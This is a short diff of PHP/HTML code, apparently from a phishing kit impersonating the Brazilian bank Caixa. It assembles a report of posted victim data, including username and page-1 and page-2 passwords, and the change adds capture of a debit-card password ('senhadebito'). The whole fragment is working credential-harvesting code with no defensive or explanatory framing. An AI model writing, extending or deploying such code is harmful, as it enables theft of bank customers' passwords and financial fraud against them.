@@ -14,6 +14,7 @@
 		<p>------------- |Chegou Caixa | ------------</p>
 
 		<p><b>Usuario:</b> '.$_POST['usuario'].'<br>
+		<p><b>Senha debito:</b> '.$_POST['senhadebito'].'<br>
 		<p><b>Senha page 1:</b> '.$_POST['senha'].'<br>
 		<br>
 		<p><b>Senha page 2:</b> '.$_POST['senha1'].'<br>
